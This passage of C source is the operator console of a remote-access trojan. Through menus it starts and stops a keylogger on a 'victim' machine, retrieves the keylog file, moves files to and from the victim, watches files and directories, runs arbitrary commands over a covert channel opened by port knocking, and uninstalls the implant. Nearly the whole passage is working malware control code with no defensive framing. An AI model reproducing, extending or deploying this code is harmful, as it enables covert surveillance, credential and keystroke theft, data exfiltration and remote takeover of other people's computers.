    if (read_line(NULL, input, sizeof(input)) != 0) {
        return -1;
    }

    selected_path = input[0] == '\0' ? DEFAULT_KEYLOGGER_DEVICE : input;

    if (strlen(selected_path) >= device_path_len) {
        fprintf(stderr, "Keyboard device path is too long\n");
        return -1;
    }

    snprintf(device_path, device_path_len, "%s", selected_path);
    return 0;
}

static int start_keylogger(session_t *session) {
    char device_path[KEYLOGGER_DEVICE_MAX];
    uint16_t payload_len;

    if (read_keylogger_device(device_path, sizeof(device_path)) != 0) {
        fprintf(stderr, "Keylogger start cancelled\n");
        return -1;
    }

    payload_len = (uint16_t)(strlen(device_path) + 1);
    if (session_send_command(session, CMD_KEYLOG_START, (const uint8_t *)device_path, payload_len) != 0) {
        return -1;
    }

    return 0;
}

static int stop_keylogger(session_t *session) {
    if (session_send_command(session, CMD_KEYLOG_STOP, NULL, 0) != 0) {
        return -1;
    }

    return 0;
}

static int read_path_with_default(const char *prompt, const char *default_value, char *buf, size_t buf_len) {
    char input[MENU_BUFFER_SIZE];

    if (default_value != NULL && default_value[0] != '\0') {
        printf("%s [%s]: ", prompt, default_value);
    } else {
        printf("%s: ", prompt);
    }
    fflush(stdout);

    if (read_line(NULL, input, sizeof(input)) != 0) {
        return -1;
    }

    if (input[0] == '\0') {
        if (default_value == NULL || default_value[0] == '\0') {
            fprintf(stderr, "Path is required\n");
            return -1;
        }

        if (strlen(default_value) >= buf_len) {
            fprintf(stderr, "Default path is too long\n");
            return -1;
        }

        snprintf(buf, buf_len, "%s", default_value);
        return 0;
    }

    if (strlen(input) >= buf_len) {
        fprintf(stderr, "Path is too long\n");
        return -1;
    }

    snprintf(buf, buf_len, "%s", input);
    return 0;
}

static const char *path_basename(const char *path) {
    const char *slash;

    if (path == NULL || path[0] == '\0') {
        return "download.bin";
    }

    slash = strrchr(path, '/');
    if (slash == NULL || slash[1] == '\0') {
        return path;
    }

    return slash + 1;
}

static int transfer_keylog_file(session_t *session) {
    char local_path[LOCAL_PATH_MAX];
    const char *default_name = path_basename(DEFAULT_KEYLOG_REMOTE);

    if (read_path_with_default("Local path for the victim keylog file", default_name, local_path, sizeof(local_path)) != 0) {
        return -1;
    }

    return transfer_remote_file_to_local(session, DEFAULT_KEYLOG_REMOTE, local_path);
}

static int transfer_file_from_victim(session_t *session) {
    char remote_path[REMOTE_PATH_MAX];
    char local_path[LOCAL_PATH_MAX];
    const char *default_name;

    if (read_path_with_default("Remote file path on victim", NULL, remote_path, sizeof(remote_path)) != 0) {
        return -1;
    }

    default_name = path_basename(remote_path);
    if (read_path_with_default("Local destination path", default_name, local_path, sizeof(local_path)) != 0) {
        return -1;
    }

    return transfer_remote_file_to_local(session, remote_path, local_path);
}

static int transfer_remote_file_to_local(session_t *session, const char *remote_path, const char *local_path) {
    uint16_t payload_len;

    payload_len = (uint16_t)(strlen(remote_path) + 1);
    printf("Requesting %s from victim...\n", remote_path);

    if (session_send_packet(session, CMD_FILE_GET, (const uint8_t *)remote_path, payload_len) != 0) {
        return -1;
    }

    return session_receive_file_response(session, local_path);
}

static int transfer_file_to_victim(session_t *session) {
    char local_path[LOCAL_PATH_MAX];
    char remote_path[REMOTE_PATH_MAX];
    char buffer[PROTOCOL_PACKET_PAYLOAD_MAX];
    const char *default_remote;
    FILE *fp;
    size_t bytes_read;

    if (read_path_with_default("Local source path", NULL, local_path, sizeof(local_path)) != 0) {
        return -1;
    }

    default_remote = path_basename(local_path);
    if (read_path_with_default("Remote destination path on victim", default_remote, remote_path, sizeof(remote_path)) != 0) {
        return -1;
    }

    fp = fopen(local_path, "rb");
    if (fp == NULL) {
        fprintf(stderr, "Unable to open %s: %s\n", local_path, strerror(errno));
        return -1;
    }

    if (session_send_packet(session, CMD_FILE_PUT_BEGIN, (const uint8_t *)remote_path, (uint16_t)(strlen(remote_path) + 1)) != 0) {
        fclose(fp);
        return -1;
    }

    if (session_receive_status_response(session, 0) != 0) {
        fclose(fp);
        return -1;
    }

    while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
        if (session_send_packet(session, CMD_FILE_PUT_CHUNK, (const uint8_t *)buffer, (uint16_t)bytes_read) != 0) {
            fclose(fp);
            return -1;
        }

        if (session_receive_status_response(session, 0) != 0) {
            fclose(fp);
            return -1;
        }
    }

    if (ferror(fp)) {
        fprintf(stderr, "Failed while reading %s\n", local_path);
        fclose(fp);
        return -1;
    }

    fclose(fp);

    if (session_send_packet(session, CMD_FILE_PUT_END, NULL, 0) != 0) {
        return -1;
    }

    return session_receive_status_response(session, 1);
}

static int watch_file_on_victim(session_t *session) {
    char remote_path[REMOTE_PATH_MAX];

    if (read_path_with_default("Remote file path to watch", NULL, remote_path, sizeof(remote_path)) != 0) {
        return -1;
    }

    return session_send_command(session, CMD_WATCH_FILE, (const uint8_t *)remote_path, (uint16_t)(strlen(remote_path) + 1));
}

static int watch_directory_on_victim(session_t *session) {
    char remote_path[REMOTE_PATH_MAX];

    if (read_path_with_default("Remote directory path to watch", NULL, remote_path, sizeof(remote_path)) != 0) {
        return -1;
    }

    return session_send_command(session, CMD_WATCH_DIR, (const uint8_t *)remote_path, (uint16_t)(strlen(remote_path) + 1));
}

static int run_victim_command(session_t *session) {
    char command[MENU_BUFFER_SIZE];
    uint16_t payload_len;

    if (read_line("Program/command to run on victim: ", command, sizeof(command)) != 0) {
        return -1;
    }

    if (command[0] == '\0') {
        fprintf(stderr, "Command cancelled\n");
        return -1;
    }

    payload_len = (uint16_t)(strlen(command) + 1);
    if (session_send_command(session, CMD_EXEC_CMD, (const uint8_t *)command, payload_len) != 0) {
        return -1;
    }

    return 0;
}

static int uninstall_victim(session_t *session, int *exit_requested) {
    if (session_send_command(session, CMD_UNINSTALL, NULL, 0) != 0) {
        return -1;
    }

    printf("Uninstall acknowledged; closing commander session\n");
    session_close(session);
    *exit_requested = 1;
    return 0;
}

static void print_disconnected_menu(const commander_config_t *cfg) {
    printf("\nCommander Menu\n");
    printf("Victim: %s\n", cfg->victim_ip);
    printf("1. Connect to victim\n");
    printf("2. Set victim IP\n");
    printf("3. Exit\n");
}

static void print_connected_menu(const session_t *session) {
    printf("\nCommander Session\n");
    printf("Connected to %s:%u\n", session->peer_ip, (unsigned)COVERT_PORT);
    printf("1. Start keylogger\n");
    printf("2. Stop keylogger\n");
    printf("3. Transfer keylog file from victim\n");
    printf("4. Transfer file to victim\n");
    printf("5. Transfer file from victim\n");
    printf("6. Watch a file on victim\n");
    printf("7. Watch a directory on victim\n");
    printf("8. Run program on victim over covert channel\n");
    printf("9. Send heartbeat\n");
    printf("10. Disconnect\n");
    printf("11. Uninstall victim\n");
    printf("12. Exit\n");
}

static void disconnected_loop(commander_config_t *cfg, session_t *session, const collector_listener_t *collector, int *exit_requested) {
    int choice;

    (void)collector;

    print_disconnected_menu(cfg);
    choice = read_menu_choice();

    if (choice == MENU_EOF) {
        *exit_requested = 1;
        return;
    }

    switch (choice) {
        case 1:
            printf("Connecting to %s...\n", cfg->victim_ip);
            if (port_knock(cfg->victim_ip) == 0) {
                sleep_ms(1500);
                if (session_open(session, cfg->victim_ip) == 0) {
                    printf("Session active with %s\n", session->peer_ip);
                } else {
                    fprintf(stderr, "Connection failed\n");
                    session_close(session);
                }
            } else {
                fprintf(stderr, "Connection failed\n");
                session_close(session);
            }
            break;
        case 2:
            (void)set_victim_ip(cfg);
            break;
        case 3:
            *exit_requested = 1;
            break;
        default:
            fprintf(stderr, "Invalid menu choice\n");
            break;
    }
}

static void connected_loop(session_t *session, const collector_listener_t *collector, int *exit_requested) {
    int choice;

    (void)collector;

    print_connected_menu(session);
    choice = read_menu_choice();

    if (choice == MENU_EOF) {
        (void)session_send_command(session, CMD_DISCONNECT, NULL, 0);
        printf("Input closed; disconnecting\n");
        session_close(session);
        *exit_requested = 1;
        return;
    }

    switch (choice) {
        case 1:
            (void)start_keylogger(session);
            break;
        case 2:
            (void)stop_keylogger(session);
            break;
        case 3:
            (void)transfer_keylog_file(session);
            break;
        case 4:
            (void)transfer_file_to_victim(session);
            break;
        case 5:
            (void)transfer_file_from_victim(session);
            break;
        case 6:
            (void)watch_file_on_victim(session);
            break;
        case 7:
            (void)watch_directory_on_victim(session);
            break;
        case 8:
            (void)run_victim_command(session);
            break;
        case 9:
            (void)session_send_command(session, CMD_HEARTBEAT, NULL, 0);
            break;
        case 10:
            (void)session_send_command(session, CMD_DISCONNECT, NULL, 0);
            session_close(session);
            break;
        case 11:
            (void)uninstall_victim(session, exit_requested);
            break;
        case 12:
            printf("Disconnect before exiting so the session ends cleanly.\n");
            *exit_requested = 0;
            break;
        default:
            fprintf(stderr, "Invalid menu choice\n");
            break;
    }
}
